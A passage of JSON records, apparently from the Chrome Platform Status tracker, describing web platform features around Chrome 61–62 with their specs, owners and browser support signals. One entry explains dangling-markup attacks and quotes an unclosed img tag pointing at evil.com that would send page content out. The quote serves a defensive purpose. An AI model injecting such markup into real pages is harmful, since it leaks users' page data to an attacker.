        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "SharedWorker.workerStart has been deprecated for a while in the spec, and is not supported by other major browsers.",
    "id": 5652075467767808,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-09-13 16:52:22.415450",
      "by": "wolenetz@chromium.org"
    },
    "name": "Support FLAC in ISO-BMFF with MSE",
    "tags": [
      "MSE",
      "FLAC",
      "MediaSource",
      "MP4",
      "ISOBMFF",
      "ISO-BMFF",
      "lossless",
      "codec"
    ],
    "comments": "Chrome has had regular src= playback of FLAC since M56 (ChromeOS had it prior to that). Chrome M57 included src= support for FLAC in MP4, using FFmpeg's implementation of the isoflac spec draft to demux.\r\nFirefox implemented support for both MSE and regular src= playback of FLAC in MP4 in version 51 (~January 2017).\r\n\r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/xiph/flac/blob/master/doc/isoflac.txt",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1286097",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "wolenetz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>Media"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "http://crbug.com/666000",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "FLAC is a lossless audio coding format, already supported in regular Chrome HTML5 playback. This feature adds support for FLAC in ISO-BMFF to Chrome HTML5 Media Source Extensions (MSE).",
    "id": 5713014258925568,
    "resources": {
      "docs": [
        "https://www.w3.org/TR/mse-byte-stream-format-isobmff/",
        "https://github.com/xiph/flac/issues/38",
        "https://github.com/w3c/media-source/issues/188"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/media/flac-in-mp4-for-mse.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-08-22 12:34:05.013760",
      "by": "tkent@chromium.org"
    },
    "name": "Update ol.start default value as 1",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/grouping-content.html#dom-ol-start",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>HTML"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=657972",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "As per the spec,\r\n\"The start IDL attribute must reflect the content attribute of the same name, with a default value of 1.\r\n\r\nThis means that the start IDL attribute does not necessarily match the list's starting value, in cases where the start content attribute is omitted and the reversed content attribute is specified.\"",
    "id": 5763018952540160,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-07-28 16:05:56.047330",
      "by": "rtoy@chromium.org"
    },
    "name": "WebAudio: OfflineAudioContext constructor with dictionary",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "ios": 62,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "http://crbug.com/737200",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The constructor for an OfflineAudioContext now accepts a dictionary argument to specify the options needed to construct the context.  This is an addition to the existing constructor that takes three arguments.",
    "id": 5635820090294272,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#OfflineAudioContext",
        "https://webaudio.github.io/web-audio-api/#offlineaudiocontextoptions"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-04-24 20:17:57.214650",
      "by": "jmedley@google.com"
    },
    "name": "WebVR v1.1",
    "tags": [
      "virtual reality",
      "VR",
      "Cardboard",
      "Oculus Rift",
      "Vive",
      "HMD",
      "Daydream"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://immersive-web.github.io/webvr/spec/1.1/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://blog.bitops.com/blog/2014/06/26/first-steps-for-vr-on-the-web/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Origin trial",
          "val": 8,
          "milestone_str": 62
        },
        "owners": [
          "bajones@chromium.org",
          "meganlindsay@chromium.org"
        ],
        "prefixed": false,
        "origintrial": true,
        "blink_components": [
          "Blink>WebVR"
        ],
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=389343",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://blogs.windows.com/msedgedev/2016/09/09/webvr-in-development-edge/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Adds input and output support for Virtual Reality head mounted displays, such as the Oculus Rift and Google Cardboard.\r\n\r\nThis API will eventually be replaced by the WebXR Device API (https://www.chromestatus.com/feature/5680169905815552).\r\n\r\nThe WebVR Origin Trial will end on July 24, 2018.",
    "id": 4532810371039232,
    "resources": {
      "docs": [
        "https://webvr.info/",
        "https://developers.google.com/web/fundamentals/vr/",
        "https://developers.google.com/web/fundamentals/vr/status/"
      ],
      "samples": [
        "https://webvr.info/samples/",
        "https://webvrexperiments.com"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-02-20 20:50:54.528890",
      "by": "jmedley@google.com"
    },
    "name": "document.rootScroller",
    "tags": [
      "root",
      "scroller",
      "rootScroller",
      "nondocument",
      "scrolling",
      "url",
      "bar",
      "top",
      "controls",
      "document"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 62
        },
        "owners": [
          "bokan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 62,
        "flag": true,
        "android": 62,
        "bug": "http://crbug.com/757016",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allow a non-document (or <body>) element to hide URL bar, generate overscroll glow, etc. on scrolling, effects normally reserved for \"viewport scrolling\" only.",
    "id": 4533350404456448,
    "resources": {
      "docs": [
        "https://github.com/bokand/NonDocumentRootScroller"
      ],
      "samples": [
        "http://bokand.github.io/rs/div.html",
        "http://bokand.github.io/totese.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-08 23:23:59.787450",
      "by": "jmedley@google.com"
    },
    "name": "visualViewport attribute event handlers",
    "tags": [
      "visual",
      "viewport",
      "onresize",
      "onscroll"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://wicg.github.io/ViewportAPI/spec.html#dom-visualviewport-onresize",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "bokan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://crbug.com/760916",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Adding attribute event handlers to visualViewport.\r\n\r\ni.e. visualViewport.onresize and visualViewport.onscroll\r\n\r\n(This is a minor fix to the shipped implementation)",
    "id": 5644570264076288,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/VisualViewport",
        "https://developer.mozilla.org/en-US/docs/Web/API/VisualViewport/onresize",
        "https://developer.mozilla.org/en-US/docs/Web/API/VisualViewport/onscroll"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:00.788270",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Blocking resources whose URLs contain both `\\n` and `<` characters.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/whatwg/fetch/pull/519",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 61
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://crbug.com/680970",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "As discussed in https://groups.google.com/a/chromium.org/d/msg/blink-dev/KaA_YNOlTPk/VmmoV88xBgAJ, some forms of dangling markup attacks rely upon injecting an unclosed attribute that sucks up portions of a page, and exfiltrates them to an external endpoint (e.g. `<img src='https://evil.com/?` eats the page until the next `'`). This is possible because the URL parser helpfully discards newline characters. It would be lovely if we could make the parser less helpful.",
    "id": 5735596811091968,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:03.048580",
      "by": "ericbidelman@google.com"
    },
    "name": "CSP: Embedded Enforcement",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec-csp/embedded/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "amalika@google.com",
          "andypaicu@chromium.org",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "ios": 61,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://crbug.com/647588",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "CSP's Embedded enforcement  defines a mechanism by which a web page can embed a nested browsing context if and only if it agrees to enforce a particular set of restrictions upon itself. We should prototype an implementation to see if it's something that solves real problems in a way we can ship.",
    "id": 5750241810710528,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-12-07 21:45:23.728640",
      "by": "jmedley@google.com"
    },
    "name": "CSSOM View smooth scroll API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/csswg/cssom-view",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://lists.w3.org/Archives/Public/www-style/2013Mar/0314.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "ajuma@chromium.org",
          "sunyunjia@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "http://crbug.com/243871",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Adds an optional argument to existing scroll APIs that specifies whether scrolling should be smooth. Also adds a CSS property for this.",
    "id": 5812155903377408,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Element/scrollIntoView"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-09-17 08:20:14.925320",
      "by": "Patket@microsoft.com"
    },
    "name": "Clear-Site-Data header",
    "tags": [
      "clear",
      "site data",
      "clear site data",
      "clear-site-data",
      "header",
      "cookies",
      "cache",
      "storage"
    ],
    "comments": "- Data are deleted by origin when possible, but in some cases (cookies, channel IDs) for the eTLD+1.\r\n- Make it possible to stop execution contexts and reload the requesting website, so that an XSS attack we are defending against can not store data in the memory and write them again after the deletion completes.\r\n- Find a way to communicate the fact that a deletion is pending, to the website as well as the user.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/webappsec-clear-site-data/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "msramek@chromium.org",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "ios": 0,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://crbug.com/607897",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A ‘Clear-Site-Data’ HTTP header prompts the user agent to clear browsing data associated with the requesting website. The supported browsing data types are cookies, storage (i.e. “site data”), and cache.\r\n\r\nThis is a privacy and security enhancing feature. A sensitive website can trigger local data deletion after the user signs out. A website dealing with a persistent XSS attack can use this to ‘reset’ itself to a clean state.",
    "id": 4713262029471744,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1I6m4QwbTNhG6wdtazamhTnArJN-UMUGqpvwH6InBEaM/"
      ],
      "samples": [
        "https://github.com/w3c/webappsec-clear-site-data/tree/master/demo"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-29 17:59:52.062840",
      "by": "jmedley@google.com"
    },
    "name": "DOMTokenList replace()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://dom.spec.whatwg.org/#dom-domtokenlist-replace",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "http://crbug.com/724906",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add the replace() function to DOMTokenList interface.  We can use it like element.classList.replace('inactive', 'active').\r\n",
    "id": 5691753315172352,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/DOMTokenList",
        "https://developer.mozilla.org/en-US/docs/Web/API/DOMTokenList/replace"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-06-13 22:59:27.278557",
      "by": "mfoltz@chromium.org"
    },
    "name": "Deprecate and remove Presentation API on insecure contexts",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/presentation-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 61
        },
        "owners": [
          "mfoltz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PresentationAPI"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=733381",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In aligning with Blink’s intention to remove powerful features on insecure origins, we plan to deprecate and remove support for the Presentation API on insecure contexts.\r\n\r\nThe initial milestone (M61) is for deprecation of PresentationRequest and PresentationReceiver.\r\n\r\nThe target milestone for removal is M71 (December 2018).\r\n",
    "id": 5766218384408576,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PresentationRequest",
        "https://developer.mozilla.org/en-US/docs/Web/API/PresentationRequest/start"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-09-05 21:48:53.673680",
      "by": "ericbidelman@google.com"
    },
    "name": "Expect-CT header",
    "tags": [
      "header"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-httpbis-expect-ct-01",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/ietf-http-wg/2016OctDec/0767.html",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "estark@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Network>CertTrans"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=679012",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Expect-CT is an HTTP header that allows sites to opt in to reporting and/or enforcement of Certificate Transparency requirements, which prevents the use of misissued certificates for that site from going unnoticed. When a site enables the Expect-CT header, they are requesting that Chrome check that any certificate for that site appears in public CT logs.",
    "id": 5677171733430272,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-09-20 18:23:13.208230",
      "by": "Patket@microsoft.com"
    },
    "name": "Geometry interfaces",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/fxtf/geometry/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/forum/#!topic/mozilla.dev.platform/pO1ArHlFXdo%5B101-125-false%5D",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "fserb@chromium.org",
          "dschulze@chromium.org",
          "cabanier@adobe.com",
          "jinho.bang@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Geometry"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "http://crbug.com/388780",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2014-June/026593.html",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This specification describes several geometry interfaces for the representation of points, rectangles, quadrilaterals and transformation matrices with the dimension of 3x2 and 4x4.\r\n\r\nSVGPoint, SVGRect and SVGMatrix will be aliased to new interfaces. Their old methods will be maintained and some new methods are introduced.\r\n\r\nIn the near future, CSS transform will be updated so they can work directly with the new objects. This avoid parsing on the js side. ",
    "id": 6015941766807552,
    "resources": {
      "samples": [
        "https://hacks.mozilla.org/2014/03/introducing-the-getboxquads-api/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-03 23:25:43.942960",
      "by": "jmedley@google.com"
    },
    "name": "HTMLIFrameElement.allowpaymentrequest",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/browser-payment-api/#paymentrequest-and-iframe-elements",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "rouslan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "desktop": 61,
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/652148",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Returns a Boolean indicating whether the Payment Request API may be invoked on a cross-origin iframe.",
    "id": 5511036157296640,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/allowPaymentRequest"
      ],
      "samples": [
        "https://rsolomakhin.github.io/pr/iframe/"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-05-03 16:00:02.893040",
      "by": "igrigorik@google.com"
    },
    "name": "HTTP Client Hints: Device-Memory",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "panicker@chromium.org",
          "fmeawad@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=710702",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Client header to expose the device Memory to web applications.",
    "id": 5741299856572416,
    "resources": {
      "docs": [
        "https://github.com/w3c/device-memory#the-header",
        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-08-30 15:26:45.877570",
      "by": "ericbidelman@google.com"
    },
    "name": "Interoperable body/documentElement scroll behavior",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://dev.w3.org/csswg/cssom-view/#dom-document-scrollingelement",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "http://crbug.com/157855",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/183967",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Update Blink to match the CSSOM View spec’s behavior around element scrolling APIs for documentElement and body, i.e.: scrollTop, scrollLeft, scrollWidth, scrollHeight and Document.scrollingElement",
    "id": 6386758136627200,
    "resources": {
      "docs": [
        "https://github.com/operasoftware/devopera/issues/242"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-08-31 21:58:06.014550",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Passive Event Listener for `type == \"mousewheel\" && target == window && function_name == \"ssc_wheel\"`",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://crbug.com/501568",
        "intervention": false
      },
